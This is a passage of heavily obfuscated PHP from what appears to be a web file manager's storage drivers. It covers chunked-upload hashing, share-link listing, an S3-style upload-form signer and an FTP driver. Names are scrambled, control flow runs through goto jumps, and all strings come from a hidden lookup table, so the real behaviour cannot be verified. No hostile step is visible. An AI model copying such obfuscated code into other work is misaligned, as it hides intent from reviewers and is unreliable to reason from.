(!feof($déã¬è ÏÖ)) { fwrite($D¢ê¨¤„, fread($déã¬è ÏÖ, 1024 * 200)); } goto d°¾¨ÓÎ; d°¾¨ÓÎ: fclose($déã¬è ÏÖ); fclose($D¢ê¨¤„); CacheLock::unlock($føôèÖÕˆß); goto C¡š‘İâˆ¿; C¡š‘İâˆ¿: return !0; goto dó¥¤ÑÊÎØ; fÜÆí’· Á: $Aá…«âƒ‚Ê =& $_SERVER[£ü]; $føôèÖÕˆß = $Aá…«âƒ‚Ê[1951] . $bËÕÃÇ‡Õé; $F‚ŞÇÉÆÀš = CacheLock::lock($føôèÖÕˆß, 1); goto C ÈÅ°ò¹; dó¥¤ÑÊÎØ: } private function statusGet() { goto D¿×ãœ¼Ú®; d‡»Ì« ´ª: if (!$this->statusData) { $bô‡–µö²˜ = array($aÔ¢˜ÏĞÛ¨[28] => $this->fileName, $aÔ¢˜ÏĞÛ¨[1939] => 0, $aÔ¢˜ÏĞÛ¨[1940] => array()); $this->statusSet($bô‡–µö²˜); } return $this->statusData; goto Cˆ£”¯¾Ã; eÊ¥ô›²÷: $FÖòÍ‘ÁÔ = !1; if (file_exists($fÜÏç††‘)) { $FÖòÍ‘ÁÔ = @file_get_contents($fÜÏç††‘); } if ($FÖòÍ‘ÁÔ) { $this->statusData = unserialize($FÖòÍ‘ÁÔ); } goto d‡»Ì« ´ª; D¿×ãœ¼Ú®: $aÔ¢˜ÏĞÛ¨ =& $_SERVER[£ü]; if (is_array($this->statusData)) { return $this->statusData; } $fÜÏç††‘ = $this->tempFile . $aÔ¢˜ÏĞÛ¨[1952]; goto eÊ¥ô›²÷; Cˆ£”¯¾Ã: } public function statusSet($b²Åó£Ä‡) { $D®ĞÈ²ĞÑÕ = $this->tempFile . $_SERVER[£ü][1952]; if (!$b²Åó£Ä‡) { if (file_exists($D®ĞÈ²ĞÑÕ)) { @unlink($D®ĞÈ²ĞÑÕ); } return !0; } $this->statusData = $b²Åó£Ä‡; return file_put_contents($D®ĞÈ²ĞÑÕ, serialize($b²Åó£Ä‡)); } private function initFileTemp() { $d»ñ±Úø¶¤ =& $_SERVER[£ü]; if (file_exists($this->tempFile)) { return; } $dÊµÏ†ôÂ’ = fopen($this->tempFile, $d»ñ±Úø¶¤[1953]); fseek($dÊµÏ†ôÂ’, $this->in[$d»ñ±Úø¶¤[77]] - 1, SEEK_SET); fwrite($dÊµÏ†ôÂ’, $d»ñ±Úø¶¤[464]); fclose($dÊµÏ†ôÂ’); } public function checkChunk() { goto B§²¬¬¸çê; bÂùêÚõèç: return $AİËˆğÖºØ; goto eÙªøÀÌ«; DœÙ¼­Ê“: $AÁƒƒ†½Ì = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($AÁƒƒ†½Ì[$bˆ›“²íÒŒ[1940]] as $EîÂ©¬¬É·) { $aŸ©†âÍ = $EîÂ©¬¬É·[$bˆ›“²íÒŒ[161]]; if ($aŸ©†âÍ) { $AİËˆğÖºØ[$bˆ›“²íÒŒ[1954] . $EîÂ©¬¬É·[$bˆ›“²íÒŒ[1026]]] = $aŸ©†âÍ; } } goto bÂùêÚõèç; B§²¬¬¸çê: $bˆ›“²íÒŒ =& $_SERVER[£ü]; $AİËˆğÖºØ = array(); CacheLock::lock($this->tempFile); goto DœÙ¼­Ê“; eÙªøÀÌ«: } private function checkChunkHash($a¥Œùöß¸Ø) { goto b× ÉëÅ¨ô; c‚°¸µî: $cÚÉİ¡•àå = !0; foreach ($a¥Œùöß¸Ø[$eä¨•öäà‡[1940]] as $bø³²†‡Ò) { fseek($cÀÄ”¯õ÷¼, $bø³²†‡Ò[$eä¨•öäà‡[1942]]); $d‡²’íğ²Ù = PathDriverStream::hash($cÀÄ”¯õ÷¼, $bø³²†‡Ò[$eä¨•öäà‡[77]]); if ($bø³²†‡Ò[$eä¨•öäà‡[161]] != $d‡²’íğ²Ù) { $cÚÉİ¡•àå = !1; break; } } fclose($cÀÄ”¯õ÷¼); goto Aë˜»‰ùó; Aë˜»‰ùó: return $cÚÉİ¡•àå; goto BÑ—ùÁª…; Díì¸Æ½„É: $b½ÂÑŸëµ® = _get($this->in, $eä¨•öäà‡[1955]); if (strlen($b½ÂÑŸëµ®) == 32 && IO::hashSimple($this->tempFile) == $fâïš¨ÙòË && IO::hashMd5($this->tempFile) == $b½ÂÑŸëµ®) { return !0; } $cÀÄ”¯õ÷¼ = fopen($this->tempFile, $eä¨•öäà‡[1152]); goto c‚°¸µî; b× ÉëÅ¨ô: $eä¨•öäà‡ =& $_SERVER[£ü]; if (count($a¥Œùöß¸Ø[$eä¨•öäà‡[1940]]) != $a¥Œùöß¸Ø[$eä¨•öäà‡[1939]]) { return !1; } $fâïš¨ÙòË = _get($this->in, $eä¨•öäà‡[1947]); goto Díì¸Æ½„É; BÑ—ùÁª…: } public static function fileName() { goto Cî¤Êî«; BÔˆáÍÂ: $aÉ²ª´‚ö = strtotime($in[$cë°‡â¿‡[1956]]); $aÉ²ª´‚ö = $aÉ²ª´‚ö ? $aÉ²ª´‚ö : time(); $BÅ§Õãßºê = strtolower($BõŒ™Ñ¹Ã¼); goto Eøƒ†Æ¾ï‚; Cî¤Êî«: $cë°‡â¿‡ =& $_SERVER[£ü]; global $in; $BõŒ™Ñ¹Ã¼ = isset($in[$cë°‡â¿‡[28]]) ? $in[$cë°‡â¿‡[28]] : $cë°‡â¿‡[33]; goto A¾ãÄ¹ò§; A¾ãÄ¹ò§: if (!empty($_FILES)) { $BõŒ™Ñ¹Ã¼ = $BõŒ™Ñ¹Ã¼ ? $BõŒ™Ñ¹Ã¼ : $_FILES[$cë°‡â¿‡[164]][$cë°‡â¿‡[383]]; } $BõŒ™Ñ¹Ã¼ = str_replace(array($cë°‡â¿‡[95], $cë°‡â¿‡[8]), array($cë°‡â¿‡[8], $cë°‡â¿‡[93]), trim($BõŒ™Ñ¹Ã¼)); if (!is_wap()) { return $BõŒ™Ñ¹Ã¼; } goto BÔˆáÍÂ; Eøƒ†Æ¾ï‚: if ($BÅ§Õãßºê == $cë°‡â¿‡[1957] || $BÅ§Õãßºê == $cë°‡â¿‡[1958]) { $BõŒ™Ñ¹Ã¼ = date($cë°‡â¿‡[679], $aÉ²ª´‚ö) . $cë°‡â¿‡[70] . $in[$cë°‡â¿‡[77]] . $cë°‡â¿‡[1589]; } else { if ($BÅ§Õãßºê == $cë°‡â¿‡[1959]) { $BõŒ™Ñ¹Ã¼ = date($cë°‡â¿‡[679], $aÉ²ª´‚ö) . $cë°‡â¿‡[70] . $in[$cë°‡â¿‡[77]] . $cë°‡â¿‡[1960]; } } return $BõŒ™Ñ¹Ã¼; goto F«èŞ“Êñ¬; F«èŞ“Êñ¬: } private function errorInfo($c±º±ÉÃ) { $C±–Ì’¨Ñ¸ =& $_SERVER[£ü]; $d‡Ø¬İ§ = array($C±–Ì’¨Ñ¸[1961], $C±–Ì’¨Ñ¸[1962], $C±–Ì’¨Ñ¸[1963], $C±–Ì’¨Ñ¸[1964], $C±–Ì’¨Ñ¸[1965], $C±–Ì’¨Ñ¸[1966], $C±–Ì’¨Ñ¸[1967], $C±–Ì’¨Ñ¸[1968]); return $c±º±ÉÃ . $C±–Ì’¨Ñ¸[4] . $d‡Ø¬İ§[$c±º±ÉÃ]; } } goto B£Ø½öÁšõ; a ­†¯°ª«: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($f‰Š÷µÑÅ‘) { $this->pathParse = $f‰Š÷µÑÅ‘; } protected function infoParse($aâ°„³°–¼) { $aòÖÇíĞÙ¶ =& $_SERVER[£ü]; return Action($aòÖÇíĞÙ¶[1005])->sharePathInfo($this->pathParse[$aòÖÇíĞÙ¶[75]], !0); } public function listPath($Bä‚¥õ³ã­, $A©ÇÅ ù›Î = false) { $b¬¢±‹ïî¡ =& $_SERVER[£ü]; $C¯Ôáåˆšá = IO::listPath($Bä‚¥õ³ã­, $A©ÇÅ ù›Î); foreach ($C¯Ôáåˆšá as $fŠÀÙæ«İµ => $cÁöø†…Á) { if (!in_array($fŠÀÙæ«İµ, array($b¬¢±‹ïî¡[73], $b¬¢±‹ïî¡[74]))) { continue; } foreach ($cÁöø†…Á as $d­ï«£“Á => $DĞ·åŒ¼‹™) { $DĞ·åŒ¼‹™ = Action($b¬¢±‹ïî¡[1115])->parsePathChildren($DĞ·åŒ¼‹™, array($b¬¢±‹ïî¡[384] => $Bä‚¥õ³ã­)); $C¯Ôáåˆšá[$fŠÀÙæ«İµ][$d­ï«£“Á] = Action($b¬¢±‹ïî¡[1005])->shareItemInfo($DĞ·åŒ¼‹™); } } return $C¯Ôáåˆšá; } public function listAll($Bµ¾öŞƒÅì) { $AêËƒ®‘’ =& $_SERVER[£ü]; $e‡³«ÇËÛ = IO::listAll($Bµ¾öŞƒÅì); foreach ($e‡³«ÇËÛ as &$dŒÈ·Ûë–Ñ) { $dŒÈ·Ûë–Ñ = array_merge(IO::info($dŒÈ·Ûë–Ñ[$AêËƒ®‘’[75]]), $dŒÈ·Ûë–Ñ); $dŒÈ·Ûë–Ñ[$AêËƒ®‘’[388]] = Action($AêËƒ®‘’[1005])->shareItemInfo($dŒÈ·Ûë–Ñ); } return $e‡³«ÇËÛ; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($fÓ£¬ƒÎ¶) { parent::__construct($fÓ£¬ƒÎ¶); $this->signatureVersion($_SERVER[£ü][197]); } public function uploadFormData($Bé… ¾†Ô, $c‚õ ‡§¨Û = 3600) { goto c×Ûùİ©Ö‹; C…Êæ•áìø: $E®œ¤Ç‡— = base64_encode(json_encode($d´òƒ¶ãÃ†)); $DÒ¯•¬ßÕ˜ = hash_hmac($eç¸Ääœâ–[1126], $e–Å—Î¸ïË, $eç¸Ääœâ–[1127] . $this->secret, !0); $fŠÑéŒ™Ï = hash_hmac($eç¸Ääœâ–[1126], $this->region, $DÒ¯•¬ßÕ˜, !0); goto aÇÀµğ©Ğ; B°É¡À°ğ: $bˆé‚Â·ˆƒ = array($this->accessKey, $e–Å—Î¸ïË, $this->region, $fÓÎ¼Ú²˜, $c§„‚™Ûº); $F—¾ç–¢÷ = implode($eç¸Ääœâ–[8], $bˆé‚Â·ˆƒ); $d´òƒ¶ãÃ† = array($eç¸Ääœâ–[1085] => gmdate($eç¸Ääœâ–[1084], strtotime($eç¸Ääœâ–[1119])), $eç¸Ääœâ–[1086] => array(array($eç¸Ääœâ–[1088] => $this->bucket), array($eç¸Ääœâ–[1087] => $bÔÈ‰âğ¿), array($eç¸Ääœâ–[1089], $eç¸Ääœâ–[1090], $eç¸Ääœâ–[33]), array($eç¸Ääœâ–[1089], $eç¸Ääœâ–[1120], $eç¸Ääœâ–[33]), array($eç¸Ääœâ–[1089], $eç¸Ääœâ–[1121], $eç¸Ääœâ–[33]), array($eç¸Ääœâ–[1091] => $Dç—¢œæ÷), array($eç¸Ääœâ–[1122] => $F—¾ç–¢÷), array($eç¸Ääœâ–[1123] => $Bê£ØÉ˜‡Ğ), array($eç¸Ääœâ–[1124] => $B›ĞÖÈà…ò), array($eç¸Ääœâ–[1125] => $B‘¸Ãà²‘‚))); goto C…Êæ•áìø; BÑ“£ÄŸÙ : $c§„‚™Ûº = $eç¸Ääœâ–[1118]; $B‘¸Ãà²‘‚ = $c‚õ ‡§¨Û . $eç¸Ääœâ–[33]; $Dç—¢œæ÷ = $eç¸Ääœâ–[1083]; goto B°É¡À°ğ; F¿‘Á“æèÒ: $fÓÎ¼Ú²˜ = $eç¸Ääœâ–[59]; $B›ĞÖÈà…ò = gmdate($eç¸Ääœâ–[1117]); $e–Å—Î¸ïË = gmdate($eç¸Ääœâ–[679]); goto BÑ“£ÄŸÙ ; fçğªÚ²Áà: $BŒÍÀÛ ªŞ = array($eç¸Ääœâ–[196] => $eç¸Ääœâ–[33], $eç¸Ääœâ–[1128] => $eç¸Ääœâ–[33], $eç¸Ääœâ–[1087] => $bÔÈ‰âğ¿, $eç¸Ääœâ–[1091] => $Dç—¢œæ÷, $eç¸Ääœâ–[1095] => $E®œ¤Ç‡—, $eç¸Ääœâ–[1129] => $F—¾ç–¢÷, $eç¸Ääœâ–[1130] => $Bê£ØÉ˜‡Ğ, $eç¸Ääœâ–[1131] => $B›ĞÖÈà…ò, $eç¸Ääœâ–[1132] => $B‘¸Ãà²‘‚, $eç¸Ääœâ–[1133] => $d“™Ö£º”Â, $eç¸Ääœâ–[166] => $this->getHost()); return $BŒÍÀÛ ªŞ; goto C¾Ì¡ÔĞòÈ; c×Ûùİ©Ö‹: $eç¸Ääœâ– =& $_SERVER[£ü]; $bÔÈ‰âğ¿ = $eç¸Ääœâ–[182]; $Bê£ØÉ˜‡Ğ = $eç¸Ääœâ–[1116]; goto F¿‘Á“æèÒ; aÇÀµğ©Ğ: $FêÜ†®ŒÁì = hash_hmac($eç¸Ääœâ–[1126], $fÓÎ¼Ú²˜, $fŠÑéŒ™Ï, !0); $dƒ·Èôùâ¬ = hash_hmac($eç¸Ääœâ–[1126], $c§„‚™Ûº, $FêÜ†®ŒÁì, !0); $d“™Ö£º”Â = hash_hmac($eç¸Ääœâ–[1126], $E®œ¤Ç‡—, $dƒ·Èôùâ¬); goto fçğªÚ²Áà; C¾Ì¡ÔĞòÈ: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($EÇ¤›§ÚÒÆ) { parent::__construct(); if (count($EÇ¤›§ÚÒÆ) > 0) { $this->_init($EÇ¤›§ÚÒÆ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($BèÉ‡­ŠğÓ) { $eÅ‘‰º£é’ =& $_SERVER[£ü]; global $config; $this->appCharset = $config[$eÅ‘‰º£é’[1134]]; $this->systemCharset = $config[$eÅ‘‰º£é’[1135]]; if (isset($BèÉ‡­ŠğÓ[$eÅ‘‰º£é’[1136]]) && $BèÉ‡­ŠğÓ[$eÅ‘‰º£é’[1136]]) { $this->systemCharset = $BèÉ‡­ŠğÓ[$eÅ‘‰º£é’[1136]]; } } public function iconvApp($e’÷‘ƒŒÈâ) { return $this->iconvTo($e’÷‘ƒŒÈâ, $this->systemCharset, $this->appCharset); } public function iconvSystem($b°ÆùÑ¤œ ) { return $this->iconvTo($b°ÆùÑ¤œ , $this->appCharset, $this->systemCharset); } public function getPathOuter($fôÙ™¬ºÔÉ) { goto FÄâ×—²¦Õ; a‰œ“ƒŸØ: $fôÙ™¬ºÔÉ = KodIO::clear($fôÙ™¬ºÔÉ); $fôÙ™¬ºÔÉ = substr($fôÙ™¬ºÔÉ, strlen($b¼Ï¤°Â…©)); if (empty($this->pathDriver)) { return $fôÙ™¬ºÔÉ; } goto fé¸¬—‹´Æ; fé¸¬—‹´Æ: return $this->pathDriver . $d¹¯÷ØïŸÈ[8] . ltrim($fôÙ™¬ºÔÉ, $d¹¯÷ØïŸÈ[8]); goto b‚‹ËŠÅİ¬; FÄâ×—²¦Õ: $d¹¯÷ØïŸÈ =& $_SERVER[£ü]; $b¼Ï¤°Â…© = $this->iconvApp($this->pathBase); $fôÙ™¬ºÔÉ = $this->iconvApp($fôÙ™¬ºÔÉ); goto Dá›÷Ó¦¦Ó; Dá›÷Ó¦¦Ó: if (substr($b¼Ï¤°Â…©, 0, 2) == $d¹¯÷ØïŸÈ[1137]) { $b¼Ï¤°Â…© = BASIC_PATH . substr($b¼Ï¤°Â…©, 2); } if (substr($fôÙ™¬ºÔÉ, 0, 2) == $d¹¯÷ØïŸÈ[1137]) { $fôÙ™¬ºÔÉ = BASIC_PATH . substr($fôÙ™¬ºÔÉ, 2); } $b¼Ï¤°Â…© = KodIO::clear($b¼Ï¤°Â…©); goto a‰œ“ƒŸØ; b‚‹ËŠÅİ¬: } private function _init($Bğƒ¦ªÕ·º = array()) { goto EÊ•®¼Û…; AÂ‚º„Ş»„: foreach ($Bğƒ¦ªÕ·º as $BÇ’áÜ½®” => $aîïÚÉÑ) { if (isset($this->{$BÇ’áÜ½®”})) { $this->{$BÇ’áÜ½®”} = $aîïÚÉÑ; } } static $Dè´•Ö…Õ = array(); $C—ğ†ì¬ Ç = md5(json_encode($Bğƒ¦ªÕ·º)); goto CÑ§İÉÃˆ·; eæÃÁ Å—ô: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $Dè´•Ö…Õ[$C—ğ†ì¬ Ç] = array($dÏ‘—Ùàˆ[1143] => $this->connect, $dÏ‘—Ùàˆ[166] => $this->host, $dÏ‘—Ùàˆ[165] => $this->scheme, $dÏ‘—Ùàˆ[167] => $this->port); goto c³ôï‚çÜ¹; EÊ•®¼Û…: $dÏ‘—Ùàˆ =& $_SERVER[£ü]; if (!function_exists($dÏ‘—Ùàˆ[1138])) { show_json(LNG($dÏ‘—Ùàˆ[1139]), !1); } $this->charsetReset($Bğƒ¦ªÕ·º); goto AÂ‚º„Ş»„; d½”Ë†÷: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $e­Ê…Íğ´œ = @ftp_login($this->connect, $this->username, $this->userpass); goto eæÃÁ Å—ô; eª„®ØÆõ: $C†Ò«®ÚÂ = isset($fçÏÎ‚Ò[$dÏ‘—Ùàˆ[165]]) && $fçÏÎ‚Ò[$dÏ‘—Ùàˆ[165]] == $dÏ‘—Ùàˆ[1140] ? !0 : !1; $this->scheme = $C†Ò«®ÚÂ ? $dÏ‘—Ùàˆ[1141] : $dÏ‘—Ùàˆ[1142]; $this->port = isset($fçÏÎ‚Ò[$dÏ‘—Ùàˆ[167]]) ? $fçÏÎ‚Ò[$dÏ‘—Ùàˆ[167]] : 21; goto d½”Ë†÷; c³ôï‚çÜ¹: return $e­Ê…Íğ´œ; goto eğ•¥ŸÊ¼; CÑ§İÉÃˆ·: if (isset($Dè´•Ö…Õ[$C—ğ†ì¬ Ç])) { foreach ($Dè´•Ö…Õ[$C—ğ†ì¬ Ç] as $BÇ’áÜ½®” => $aîïÚÉÑ) { $this->{$BÇ’áÜ½®”} = $aîïÚÉÑ; } return !0; } $fçÏÎ‚Ò = parse_url(trim($this->server, $dÏ‘—Ùàˆ[8])); $this->host = $fçÏÎ‚Ò[$dÏ‘—Ùàˆ[166]]; goto eª„®ØÆõ; eğ•¥ŸÊ¼: } private function _isconn() { return is_resource($this->connect); } public function mkfile($e…¡ŞµËš¡, $dáöƒÔÎº¤ = '', $fóË³ë×ßà = REPEAT_RENAME) { if ($this->setContent($e…¡ŞµËš¡, $dáöƒÔÎº¤)) { return $this->getPathOuter($e…¡ŞµËš¡); } return !1; } public function mkdir($C‡†¦µÒÚï, $DÅ¼‹¹¡í = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $C‡†¦µÒÚï = $this->iconvSystem($C‡†¦µÒÚï); if ($this->isFolder($C‡†¦µÒÚï) || @ftp_mkdir($this->connect, $C‡†¦µÒÚï)) { return $this->getPathOuter($C‡†¦µÒÚï); } if (!$this->mkdir($this->pathFather($C‡†¦µÒÚï))) { return !1; } if ($C‡†¦µÒÚï = @ftp_mkdir($this->connect, $C‡†¦µÒÚï)) { return $this->getPathOuter($C‡†¦µÒÚï); } return !1; } public function copyFile($A˜í‘Ñ“àŞ, $B”ğ¼ää‚) { goto aŒÈÅ“Áí; aèá°‰™“: $f–†âŸŒ¼Š = $this->iconvApp($A»Ôåœ‰ªĞ); $this->download($A˜í‘Ñ“àŞ, $f–†âŸŒ¼Š); $EÑ¸ßàÁ™Ç = $this->upload($B”ğ¼ää‚, $f–†âŸŒ¼Š); goto CÓ˜Îˆ„¶İ; CÓ˜Îˆ„¶İ: $this->tempFileRemve($A»Ôåœ‰ªĞ); return $EÑ¸ßàÁ™Ç; goto f˜¬­Ñ¾Ä¥; aŒÈÅ“Áí: if (!$this->_isconn()) { return !1; } $E¬„ôõİ¬— = $this->pathThis($this->iconvSystem($A˜í‘Ñ“àŞ)); $A»Ôåœ‰ªĞ = $this->tempFile($E¬„ôõİ¬—); goto aèá°‰™“; f˜¬­Ñ¾Ä¥: } public function moveFile($dõïğ¨¶òã, $fÅ‹Ö½»¼‘) { if (!$this->_isconn()) { return !1; } $dõïğ¨¶òã = $this->iconvSystem($dõïğ¨¶òã); $fÅ‹Ö½»¼‘ = $this->iconvSystem($fÅ‹Ö½»¼‘); $B£ÊŠª‚ˆß = @ftp_rename($this->connect, $dõïğ¨¶òã, $fÅ‹Ö½»¼‘); return $B£ÊŠª‚ˆß ? $this->getPathOuter($fÅ‹Ö½»¼‘) : !1; } public function delFile($cßÅ§…Ç») { if (!$this->_isconn()) { return !1; } $cßÅ§…Ç» = $this->iconvSystem($cßÅ§…Ç»); return @ftp_delete($this->connect, $cßÅ§…Ç»); } public function delFolder($B›¸¤…ò•) { if (!$this->_isconn()) { return !1; } $B›¸¤…ò• = $this->iconvSystem($B›¸¤…ò•); $cóÂ†‰Ô‘Ù = $this->ftpList($B›¸¤…ò•); if (!$cóÂ†‰Ô‘Ù) { return @ftp_rmdir($this->connect, $B›¸¤…ò•); } foreach ($cóÂ†‰Ô‘Ù as $eÎ×†²½ªÄ) { if ($this->isFolder($eÎ×†²½ªÄ)) { $eÎ×†²½ªÄ = $this->iconvApp($eÎ×†²½ªÄ); $this->delFolder($eÎ×†²½ªÄ); } else { @ftp_delete($this->connect, $eÎ×†²½ªÄ); } } return @ftp_rmdir($this->connect, $B›¸¤…ò•); } public function rename($b™ÜÆÔ½Í, $B›ğ¾èØŠ¤) { goto DÚË÷Ş¿‚ì; aÓÂ¿¦Æêó: $d„‚êƒìÉ¿ = rtrim($FŠîáƒËÀ, $e¾¿àÓ¯²¢[8]) . $e¾¿àÓ¯²¢[8] . $D¢°Ê©ŠØ»; $b¯æô™–Òğ = @ftp_rename($this->connect, $b™ÜÆÔ½Í, $d„‚êƒìÉ¿); $d„‚êƒìÉ¿ = $this->iconvApp($d„‚êƒìÉ¿); goto Dî¯òğºÁ©; DÚË÷Ş¿‚ì: $e¾¿àÓ¯²¢ =& $_SERVER[£ü]; if (!$this->_isconn()) { return !1; } $D¢°Ê©ŠØ» = $this->fileNameAuto($this->pathFather($b™ÜÆÔ½Í), $B›ğ¾èØŠ¤); goto cºöš¡ƒ‘; Dî¯òğºÁ©: return $b¯æô™–Òğ ? $this->getPathOuter($d„‚êƒìÉ¿) : !1; goto e‡ßŠ®ˆ¯; cºöš¡ƒ‘: $D¢°Ê©ŠØ» = $this->iconvSystem($D¢°Ê©ŠØ»); $b™ÜÆÔ½Í = $this->iconvSystem($b™ÜÆÔ½Í); $FŠîáƒËÀ = $this->pathFather($b™ÜÆÔ½Í); goto aÓÂ¿¦Æêó; e‡ßŠ®ˆ¯: } private function folderInfo($bÏ™Ñ­Šà, $CäŠÚä›”¶ = false) { goto d„©¼”ß»˜; d„©¼”ß»˜: $eà¶´Å¤Çõ =& $_SERVER[£ü]; $D¾õè¿Õ¬ = $this->getPathOuter(rtrim($bÏ™Ñ­Šà, $eà¶´Å¤Çõ[8])); $aİÌõå¥™ğ = $this->pathThis($D¾õè¿Õ¬); goto cŒ«¬¥Û“¾; cŒ«¬¥Û“¾: $Aã‚Á‡ØÍÆ = $this->iconvSystem($bÏ™Ñ­Šà); if ($CäŠÚä›”¶) { return array($eà¶´Å¤Çõ[28] => $aİÌõå¥™ğ, $eà¶´Å¤Çõ[75] => $D¾õè¿Õ¬, $eà¶´Å¤Çõ[29] => $eà¶´Å¤Çõ[76]); } $F—œù¥ì¬Ÿ = array($eà¶´Å¤Çõ[28] => $aİÌõå¥™ğ, $eà¶´Å¤Çõ[75] => $D¾õè¿Õ¬, $eà¶´Å¤Çõ[29] => $eà¶´Å¤Çõ[76], $eà¶´Å¤Çõ[184] => 0, $eà¶´Å¤Çõ[107] => 0, $eà¶´Å¤Çõ[1144] => !0, $eà¶´Å¤Çõ[1145] => !0); goto a²ãÎæâ¿Ü; a²ãÎæâ¿Ü: return $F—œù¥ì¬Ÿ; goto AóĞÑÔ¦Äº; AóĞÑÔ¦Äº: } private function fileInfo($eµ®Àè“ƒê, $dùİÚµ‡ÉÌ = false) { goto cÌ•”‚è¥ˆ; CÎŸùÙ‡¹—: $EÚ‘ÂÈº¹¸ = $this->iconvSystem($eµ®Àè“ƒê); if ($dùİÚµ‡ÉÌ) { return array($AªŒâ—Ø¸œ[28] => $FÅôîÀµ”Ç, $AªŒâ—Ø¸œ[75] => $fÇë×¤œä’, $AªŒâ—Ø¸œ[29] => $AªŒâ—Ø¸œ[164], $AªŒâ—Ø¸œ[157] => $this->ext($eµ®Àè“ƒê), $AªŒâ—Ø¸œ[77] => $this->size($eµ®Àè“ƒê)); } $b‰ä©«ÀËÓ = array($AªŒâ—Ø¸œ[28] => $FÅôîÀµ”Ç, $AªŒâ—Ø¸œ[75] => $fÇë×¤œä’, $AªŒâ—Ø¸œ[29] => $AªŒâ—Ø¸œ[164], $AªŒâ—Ø¸œ[184] => 0, $AªŒâ—Ø¸œ[107] => @ftp_mdtm($this->connect, $EÚ‘ÂÈº¹¸), $AªŒâ—Ø¸œ[157] => $this->ext($eµ®Àè“ƒê), $AªŒâ—Ø¸œ[77] => $this->size($eµ®Àè“ƒê), $AªŒâ—Ø¸œ[1144] => !0, $AªŒâ—Ø¸œ[1145] => !0); goto fßÜÑ‘ŸŒİ; fßÜÑ‘ŸŒİ: $b‰ä©«ÀËÓ[$AªŒâ—Ø¸œ[107]] = $b‰ä©«ÀËÓ[$AªŒâ—Ø¸œ[107]] > 0 ? $b‰ä©«ÀËÓ[$AªŒâ—Ø¸œ[107]] : 0; return $b‰ä©«ÀËÓ; goto aïÔ”ñ à³; cÌ•”‚è¥ˆ: $AªŒâ—Ø¸œ =& $_SERVER[£ü]; $fÇë×¤œä’ = $this->getPathOuter(rtrim($eµ®Àè“ƒê, $AªŒâ—Ø¸œ[8])); $FÅôîÀµ”Ç = $this->pathThis($fÇë×¤œä’); goto CÎŸùÙ‡¹—; aïÔ”ñ à³: } public function size($C¾äÃù­¤­) { $f‘´òÛ†…Ğ = $this->objectMeta($C¾äÃù­¤­); return $f‘´òÛ†…Ğ ? $f‘´òÛ†…Ğ[$_SERVER[£ü][77]] : 0; } public function info($A¿—¾Ø–İæ) { if ($this->isFile($A¿—¾Ø–İæ)) { return $this->fileInfo($A¿—¾Ø–İæ, 0); } else { if ($this->isFolder($A¿—¾Ø–İæ)) { return $this->folderInfo($A¿—¾Ø–İæ); } } return !1; } public function exist($b±ğ‰Ò‰ìÍ) { return $this->objectMeta($b±ğ‰Ò‰ìÍ) ? !0 : !1; } public function isFile($cˆ³ÓÇ‚İ) { $cã¿Ö®ƒŒ« =& $_SERVER[£ü]; $E•ƒ©ÒâóÒ = $this->objectMeta($cˆ³ÓÇ‚İ); return $E•ƒ©ÒâóÒ ? $E•ƒ©ÒâóÒ[$cã¿Ö®ƒŒ«[29]] == $cã¿Ö®ƒŒ«[164] : !1; } public function isFolder($Aª´Ğš’†¢) { $DÏÍ²æ«Æ¡ =& $_SERVER[£ü]; $eƒŞåí‚§Ù = $this->objectMeta($Aª´Ğš’†¢); return $eƒŞåí‚§Ù ? $eƒŞåí‚§Ù[$DÏÍ²æ«Æ¡[29]] == $DÏÍ²æ«Æ¡[76] : !1; } public function listPath($f»ß¸Şµ’Ù, $då½ˆÔŒ„‚ = false) { goto c¢Ÿ‚Ú‹“›; Bù§ÏŒ«âé: $c™¨æĞÌØ’ = $this->ftpList($f»ß¸Şµ’Ù); $fê°ÜíÛ™¡ = array($b¶Ó»†÷â[74] => array(), $b¶Ó»†÷â[73] => array()); if (!$c™¨æĞÌØ’) { return $fê°ÜíÛ™¡; } goto BÉÜæ›»¼À; BÉÜæ›»¼À: foreach ($c™¨æĞÌØ’ as $f»ß¸Şµ’Ù) { if ($this->isFolder($f»ß¸Şµ’Ù)) { $fê°ÜíÛ™¡[$b¶Ó»†÷â[74]][] = $this->folderInfo($f»ß¸Şµ’Ù, $då½ˆÔŒ„‚); } else { $fê°ÜíÛ™¡[$b¶Ó»†÷â[73]][] = $this->fileInfo($f»ß¸Şµ’Ù, $då½ˆÔŒ„‚); } } return $fê°ÜíÛ™¡; goto e½õ˜‘ôÄ¬; c¢Ÿ‚Ú‹“›: $b¶Ó»†÷â =& $_SERVER[£ü]; if (!$this->_isconn()) { return !1; } $f»ß¸Şµ’Ù = $this->iconvSystem($f»ß¸Şµ’Ù); goto Bù§ÏŒ«âé; e½õ˜‘ôÄ¬: } public function has($dİ±Ü¤¾ÜŸ, $b•ô÷ù°¤ = false, $bÃ‚õ’÷Ê± = true) { goto CÛàÖ‹éÒ; bÈ±÷¦î—‡: foreach ($a‘…»“¸‰ as $dİ±Ü¤¾ÜŸ) { if ($bÃ‚õ’÷Ê±) { if (!$this->isFolder($dİ±Ü¤¾ÜŸ)) { return !0; } } else { if ($this->isFolder($dİ±Ü¤¾ÜŸ)) { return !0; } } } return !1; goto Cô©òİÑÉ»; CÛàÖ‹éÒ: $B‹¹„¥®¶ =& $_SERVER[£ü]; if (!$this->_isconn()) { return !1; } $dİ±Ü¤¾ÜŸ = $this->iconvSystem($dİ±Ü¤¾ÜŸ); goto b§Û¼™Í¤; b§Û¼™Í¤: $a‘…»“¸‰ = $this->ftpList($dİ±Ü¤¾ÜŸ); if (!$a‘…»“¸‰) { return !1; } if ($b•ô÷ù°¤) { return array($B‹¹„¥®¶[188] => 0, $B‹¹„¥®¶[189] => count($a‘…»“¸‰)); } goto bÈ±÷¦î—‡; Cô©òİÑÉ»: } public function listAll($bÌï’â±àÆ) { goto Bôï°Ô†¶®; EŸ¥ÌëøÓ„: foreach ($d™¹à›¾‹Ã[$f³Ğ¤Ö·ñ[74]] as 